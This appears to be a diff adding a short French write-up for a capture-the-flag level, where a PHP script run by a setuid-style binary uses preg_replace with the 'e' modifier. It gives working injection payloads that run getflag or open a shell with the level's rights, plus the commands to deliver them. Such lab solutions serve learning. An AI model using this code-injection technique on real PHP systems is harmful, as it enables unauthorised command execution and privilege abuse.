@@ -1,0 +1,13 @@
+un binaire est present plus la source en php
+le binaire attend un argument
+
+la fonction preg_replace avec le modifier 'e' rend le binaire vulnerable aux injections.
+
+pour resoudre ce level, il faut creer un fichier dans lequel nous allons au choix soit mettre:
+    -[x {${@exec(getflag)}}]
+        ceci reverra directement le flag
+    -[x {${@exec(sh)}}]
+        ceci ouvre un shell avec les droits du level6, ensuite il suffit de taper la commande 'getflag'
+
+~/echo '-[x {${@exec(getflag)}}]' > /tmp/inject
+~/./level06 /tmp/inject
